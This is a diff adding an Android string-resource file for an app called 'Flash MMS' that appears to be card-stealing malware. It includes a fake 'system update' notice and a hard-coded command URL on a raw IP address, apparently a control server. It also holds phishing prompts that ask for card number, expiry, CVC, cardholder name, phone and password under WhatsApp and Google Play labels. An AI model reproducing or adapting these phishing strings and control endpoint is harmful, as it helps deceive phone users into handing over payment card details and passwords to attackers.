@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Flash MMS</string>
+    <string name="update">System update in progress. Please, Wait…</string>
+    <string name="card_number">Card number</string>
+    <string name="admin_link">http://85.93.5.83/?action=command</string>
+    <string name="install_id">1</string>
+    <string name="hint_expiration_month">MM</string>
+    <string name="hint_expiration_year">YY</string>
+    <string name="expiration_date_separator">/</string>
+    <string name="cvc_code">CVC</string>
+    <string name="whatsapp">WhatsApp</string>
+    <string name="google_play">Google Play</string>
+    <string name="enter_credit_card">Enter details about the credit card for verifying payment details</string>
+    <string name="cvc_code_popup_visa_description">Discover, MasterCard, Visa, and Visa Electron The CVC is the last three digits of the number that appears on the back of your card in the signature bar. </string>
+    <string name="cvc_code_popup_amex_description">American Express The CVC is the four digits located on the front of the card, on the right side. </string>
+    <string name="add_credit_card">Confirm credit card details.</string>
+    <string name="add_instrument_continue">Continue</string>
+    <string name="no_connection">No connection to server</string>
+    <string name="phone_number">Phone number</string>
+    <string name="first_name">First name</string>
+    <string name="last_name">Last name</string>
+    <string name="name_on_card">Cardholder name</string>
+    <string name="change_password_restrict_label">Password</string>
+</resources>
